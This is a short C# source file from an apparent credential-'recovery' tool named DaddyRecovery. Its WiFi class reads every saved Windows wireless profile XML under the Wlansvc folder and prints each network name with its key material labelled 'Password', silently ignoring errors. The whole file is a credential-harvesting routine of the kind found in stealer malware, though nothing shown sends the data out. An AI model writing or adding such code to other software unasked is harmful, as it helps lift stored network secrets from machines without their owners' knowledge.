namespace DaddyRecovery.Applications
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Xml;
    using System.Xml.Linq;
    using Helpers;

    public static class WiFi
    {
        public static void Inizialize()
        {
            var wifipath = CombineEx.CombinePath(GlobalPath.AllUsers, @"Microsoft\Wlansvc\Profiles\Interfaces");
            try
            {
                var wafla = new DirectoryInfo(wifipath);
                if (wafla.Exists)
                {
                    foreach (var file in wafla.GetDirectories("{*}").SelectMany(info => info.GetFiles().Select(file => file)))
                    {
                        string wificonfig = CombineEx.CombinePath(file.FullName);
                        if (wificonfig.EndsWith(".xml"))
                        {
                            XNamespace xmlns = "http://www.microsoft.com/networking/WLAN/profile/v1";
                            var xml = XDocument.Load(wificonfig);
                            string name = xml.Root.Element(xmlns + "name").Value, keyMaterial = xml.Descendants(xmlns + "keyMaterial").Single().Value;

                            Console.WriteLine($"Profile: {name}");
                            Console.WriteLine($"Password: {keyMaterial}");
                        }
                    }
                }
            }
            catch { }
        }
    }
}